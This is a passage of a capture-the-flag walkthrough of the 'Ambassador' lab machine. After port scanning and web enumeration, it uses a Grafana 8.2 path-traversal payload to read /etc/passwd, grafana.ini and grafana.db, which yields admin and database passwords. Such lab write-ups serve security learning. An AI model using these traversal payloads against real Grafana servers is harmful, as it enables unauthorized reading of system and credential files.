![image](https://user-images.githubusercontent.com/87700008/209716180-551c8c83-ec7e-450c-b25e-0bf10b075384.png)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

**Port scan:**

Started with the quck rustscan for port scanning & found 4 open ports :

    Open 10.10.11.183:22  --> ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
    Open 10.10.11.183:80  --> http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
    Open 10.10.11.183:3000  --> ppp?    syn-ack ttl 63
    Open 10.10.11.183:3306  --> mysql   syn-ack ttl 63 MySQL 8.0.30-0ubuntu0.20.04.2
    
        PORT     STATE SERVICE REASON         VERSION
        22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
        | ssh-hostkey: 
        |   3072 29:dd:8e:d7:17:1e:8e:30:90:87:3c:c6:51:00:7c:75 (RSA)
        | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDLYy5+VCwR+2NKWpIRhSVGI1nJQ5YeihevJqIYbfopEW03vZ9SgacRzs4coGfDbcYa+KPePbz2n+2zXytEPfzBzFysLXgTaUlDFcDqEsWP9pJ5UYFNfXqHCOyDRklsetFOBcxkgC8/IcHDJdJQTEr51KLF75ZXaEIcjZ+XuQWsOrU5DJPrAlCmG12OMjsnP4OfI4RpIjELuLCyVSItoin255/99SSM3koBheX0im9/V8IOpEye9Fc2LigyGA+97wwNSZG2G/duS6lE8pYz1unL+Vg2ogGDN85TkkrS3XdfDLI87AyFBGYniG8+SMtLQOd6tCZeymGK2BQe1k9oWoB7/J6NJ0dylAPAVZ1sDAU7KCUPNAex8q6bh0KrO/5zVbpwMB+qEq6SY6crjtfpYnd7+2DLwiYgcSiQxZMnY3ZkJiIf6s5FkJYmcf/oX1xm/TlP9qoxRKYqLtEJvAHEk/mK+na1Esc8yuPItSRaQzpCgyIwiZCdQlTwWBCVFJZqrXc=
        |   256 80:a4:c5:2e:9a:b1:ec:da:27:64:39:a4:08:97:3b:ef (ECDSA)
        | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFgGRouCNEVCXufz6UDFKYkcd3Lmm6WoGKl840u6TuJ8+SKv77LDiJzsXlqcjdeHXA5O87Us7Npwydhw9NYXXYs=
        |   256 f5:90:ba:7d:ed:55:cb:70:07:f2:bb:c8:91:93:1b:f6 (ED25519)
        |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINujB7zPDP2GyNBT4Dt4hGiheNd9HOUMN/5Spa21Kg0W
        80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
        |_http-generator: Hugo 0.94.2
        | http-methods: 
        |_  Supported Methods: GET POST OPTIONS HEAD
        |_http-server-header: Apache/2.4.41 (Ubuntu)
        |_http-title: Ambassador Development Server
        3000/tcp open  ppp?    syn-ack ttl 63
        | fingerprint-strings: 
        |   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
        |     HTTP/1.1 400 Bad Request
        |     Content-Type: text/plain; charset=utf-8
        |     Connection: close
        |     Request
        |   GetRequest: 
        |     HTTP/1.0 302 Found
        |     Cache-Control: no-cache
        |     Content-Type: text/html; charset=utf-8
        |     Expires: -1
        |     Location: /login
        |     Pragma: no-cache
        |     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
        |     X-Content-Type-Options: nosniff
        |     X-Frame-Options: deny
        |     X-Xss-Protection: 1; mode=block
        |     Date: Tue, 27 Dec 2022 19:21:20 GMT
        |     Content-Length: 29
        |     href="/login">Found</a>.
        |   HTTPOptions: 
        |     HTTP/1.0 302 Found
        |     Cache-Control: no-cache
        |     Expires: -1
        |     Location: /login
        |     Pragma: no-cache
        |     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
        |     X-Content-Type-Options: nosniff
        |     X-Frame-Options: deny
        |     X-Xss-Protection: 1; mode=block
        |     Date: Tue, 27 Dec 2022 19:21:25 GMT
        |_    Content-Length: 0
        3306/tcp open  mysql   syn-ack ttl 63 MySQL 8.0.30-0ubuntu0.20.04.2
        | mysql-info: 
        |   Protocol: 10
        |   Version: 8.0.30-0ubuntu0.20.04.2
        |   Thread ID: 32
        |   Capabilities flags: 65535
        |   Some Capabilities: ODBCClient, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, FoundRows, IgnoreSigpipes, Support41Auth, ConnectWithDatabase, InteractiveClient, DontAllowDatabaseTableColumn, Speaks41ProtocolNew, SupportsLoadDataLocal, LongColumnFlag, SupportsTransactions, LongPassword, SwitchToSSLAfterHandshake, SupportsCompression, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
        |   Status: Autocommit
        |   Salt: a\x05\x02l&\x04\x17\x19c:M]\x01.9d\x7FM~T
        |_  Auth Plugin Name: caching_sha2_password
        |_ssl-cert: ERROR: Script execution failed (use -d to debug)
        |_ssl-date: ERROR: Script execution failed (use -d to debug)
        |_sslv2: ERROR: Script execution failed (use -d to debug)
        |_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
        1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
        SF-Port3000-TCP:V=7.91%I=7%D=12/27%Time=63AB45AE%P=x86_64-unknown-linux-gn
        SF:u%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type
        SF::\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x2
        SF:0Bad\x20Request")%r(GetRequest,174,"HTTP/1\.0\x20302\x20Found\r\nCache-
        SF:Control:\x20no-cache\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\
        SF:nExpires:\x20-1\r\nLocation:\x20/login\r\nPragma:\x20no-cache\r\nSet-Co
        SF:okie:\x20redirect_to=%2F;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nX-
        SF:Content-Type-Options:\x20nosniff\r\nX-Frame-Options:\x20deny\r\nX-Xss-P
        SF:rotection:\x201;\x20mode=block\r\nDate:\x20Tue,\x2027\x20Dec\x202022\x2
        SF:019:21:20\x20GMT\r\nContent-Length:\x2029\r\n\r\n<a\x20href=\"/login\">
        SF:Found</a>\.\n\n")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCont
        SF:ent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r
        SF:\n400\x20Bad\x20Request")%r(HTTPOptions,12E,"HTTP/1\.0\x20302\x20Found\
        SF:r\nCache-Control:\x20no-cache\r\nExpires:\x20-1\r\nLocation:\x20/login\
        SF:r\nPragma:\x20no-cache\r\nSet-Cookie:\x20redirect_to=%2F;\x20Path=/;\x2
        SF:0HttpOnly;\x20SameSite=Lax\r\nX-Content-Type-Options:\x20nosniff\r\nX-F
        SF:rame-Options:\x20deny\r\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:
        SF:\x20Tue,\x2027\x20Dec\x202022\x2019:21:25\x20GMT\r\nContent-Length:\x20
        SF:0\r\n\r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCon
        SF:tent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\
        SF:r\n400\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\
        SF:x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnecti
        SF:on:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"
        SF:HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20c
        SF:harset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(T
        SF:LSSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x2
        SF:0text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad
        SF:\x20Request")%r(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCont
        SF:ent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r
        SF:\n400\x20Bad\x20Request");
        Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
        

Went to the webserver running on port 80, http://10.10.11.183:80 & got this page, which contains just a post about SSH login :

![image](https://user-images.githubusercontent.com/87700008/210255651-4ea71658-0bf8-495d-a4ba-3a07a4e7e68e.png)

In the post it's mentioned that "Connecting to this machine Use the developer account to SSH, DevOps will give you the password."

I ran the go buster against the web server but didn't get any useful subdirectory.

        gobuster dir -u http://10.10.11.183 -t 20 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o amb_web -b 404,403 -k
        
![image](https://user-images.githubusercontent.com/87700008/210258728-0c2c07f2-5aba-43ef-b56b-19d88848776c.png)

On the image sub-directory "http://10.10.11.183/images/" there is 1 image present, so I downloaded it check for the metadata but didn't get any useful info.

![image](https://user-images.githubusercontent.com/87700008/210258905-657f1612-191e-43be-ae4c-74f9e2fddd60.png)

        File Name                       : gohugo-default-sample-hero-image.jpg
        Directory                       : .
        File Size                       : 283 kB
        File Modification Date/Time     : 2023:01:02 11:13:31-05:00
        File Access Date/Time           : 2023:01:02 11:13:30-05:00
        File Inode Change Date/Time     : 2023:01:02 11:13:31-05:00
        File Permissions                : -rw-r--r--
        File Type                       : JPEG
        File Type Extension             : jpg
        MIME Type                       : image/jpeg
        JFIF Version                    : 1.01
        Exif Byte Order                 : Big-endian (Motorola, MM)
        X Resolution                    : 72
        Y Resolution                    : 72
        Resolution Unit                 : inches
        Exif Image Width                : 4484
        Exif Image Height               : 2000
        Focal Plane X Resolution        : 72
        Focal Plane Y Resolution        : 72
        Focal Plane Resolution Unit     : None
        Lens Model                      : 
        XMP Toolkit                     : XMP Core 5.5.0
        Lens                            : 
        IPTC Digest                     : d41d8cd98f00b204e9800998ecf8427e
        Profile CMM Type                : Little CMS
        Profile Version                 : 2.1.0
        Profile Class                   : Display Device Profile
        Color Space Data                : RGB
        Profile Connection Space        : XYZ
        Profile Date Time               : 2012:01:25 03:41:57
        Profile File Signature          : acsp
        Primary Platform                : Apple Computer Inc.
        CMM Flags                       : Not Embedded, Independent
        Device Manufacturer             : 
        Device Model                    : 
        Device Attributes               : Reflective, Glossy, Positive, Color
        Rendering Intent                : Perceptual
        Connection Space Illuminant     : 0.9642 1 0.82491
        Profile Creator                 : Little CMS
        Profile ID                      : 0
        Profile Description             : c2
        Profile Copyright               : IX
        Media White Point               : 0.9642 1 0.82491
        Media Black Point               : 0.01205 0.0125 0.01031
        Red Matrix Column               : 0.43607 0.22249 0.01392
        Green Matrix Column             : 0.38515 0.71687 0.09708
        Blue Matrix Column              : 0.14307 0.06061 0.7141
        Red Tone Reproduction Curve     : (Binary data 64 bytes, use -b option to extract)
        Green Tone Reproduction Curve   : (Binary data 64 bytes, use -b option to extract)
        Blue Tone Reproduction Curve    : (Binary data 64 bytes, use -b option to extract)
        Comment                         : Optimized by JPEGmini 3.13.3.8 0xff602a7c
        Image Width                     : 1440
        Image Height                    : 642
        Encoding Process                : Baseline DCT, Huffman coding
        Bits Per Sample                 : 8
        Color Components                : 3
        Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
        Image Size                      : 1440x642
        Megapixels                      : 0.924
        
I then moved on to port 3000 which is also running a webserver with Grafana v8.2 & got a login page:

![image](https://user-images.githubusercontent.com/87700008/210262162-0197083d-edf9-464e-8dcc-bc846cac8263.png)

I tried the Grafana default credential but it didn't worked.

I quickly searched for the exploit & found that this version of Grafana is vulnerable to "Directory Traversal and Arbitrary File Read".
So I fired up my burp & started intercepting the request. And landed onto this page for the POC, ref : https://exploit-notes.hdks.org/exploit/grafana-pentesting/#default-credential

![image](https://user-images.githubusercontent.com/87700008/210263745-370097b7-c453-4be6-827f-38611669217e.png)

I supplied the payload from the blog to read the '/etc/passwd' directory & it worked.

        /public/plugins/alertlist/../../../../../../../../etc/passwd
        
![image](https://user-images.githubusercontent.com/87700008/210263915-7bf620ec-1285-4c09-96a4-54132f4e8eb8.png)

Next, I supplied below payload & got the data of Grafana configuration file :

        /public/plugins/alertlist/../../../../../../../../etc/grafana/grafana.ini
        
![image](https://user-images.githubusercontent.com/87700008/210264473-a5e89831-016d-4ae1-9576-bbda60210551.png)

Next, I got hold on the Grafana DB :

        /public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db
        
![image](https://user-images.githubusercontent.com/87700008/210264641-4c1c16aa-e8fd-4b33-bd04-9bfe5b7cbb5b.png)

Then after extracting all the sensitive files I dived into the Grafana configuration first & got the admin password in it.

![image](https://user-images.githubusercontent.com/87700008/210265773-cac0f219-d69a-4b3e-a99b-3f478ac3a599.png)

Using the admin & password I logged into the portal.

![image](https://user-images.githubusercontent.com/87700008/210268405-28f8b710-4ff4-40e6-ae43-857fec6a7945.png)

I searched in page to exploit some plugins but no luck here. 😕
Then I moved back & checked the Grafana DB which I extracted earlier. In the DB, in one of the schema named 'data_source' I found password for the user grafana.

![image](https://user-images.githubusercontent.com/87700008/210271015-ada30fd1-a7f3-4cde-ab52-cf0f34fca7ec.png)

